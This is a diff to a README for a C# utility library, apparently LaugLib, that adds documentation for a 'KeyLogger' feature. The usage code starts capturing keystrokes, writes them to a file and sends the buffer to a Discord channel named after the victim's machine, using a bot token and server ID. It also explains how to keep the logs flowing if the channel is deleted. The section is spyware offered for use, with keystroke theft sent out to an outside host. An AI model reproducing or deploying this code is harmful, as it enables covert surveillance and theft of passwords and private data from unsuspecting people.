@@ -238,6 +238,32 @@ hook.Send(message);
 hook.Send(message, new FileInfo("C:/File/Path.file"));
 ```
 
+## KeyLogger
+Easy to use KeyLogger with many functions
+<br><br>
+**Code Usage**
+> Imports
+```CSharp
+using LaugLib;
+```
+> Declare Instance
+```CSharp
+KeyLogger logger = new KeyLogger();
+```
+> Example usage that sends KeyLog Buffer to a Discord Channel
+```CSharp
+logger.BotToken = "DISCORD_BOT_TOKEN"; //Your Discord Bot Token
+logger.ChannelName = Environment.MachineName; //This can be any String
+logger.GuildID = 0; //The Guild ID (Server ID) to create the channel in and write the KeyLogs
+logger.ParentID = 0; //Parent ID is basically the Category ID
+
+logger.StartKeyLogger(true, 5, "-", true); //First Parameter: WriteToFile (Its required to send logs to discord), Second Parameter: MaxBufferLength, Third Parameter: The file Name, use "-" to generate a random File name, Fourth Parameter: SendToDiscordChannel
+```
+> Known Bug with channel
+```CSharp
+logger.ClearSavedChannelID(); //If you delete the channel in your server, the Program wont be able to send any Logs, with this function you delete the saved channelID and it creates a new one for writing.
+```
+
 ## LaugMail
 Send Emails with Gmail
 <br><br>
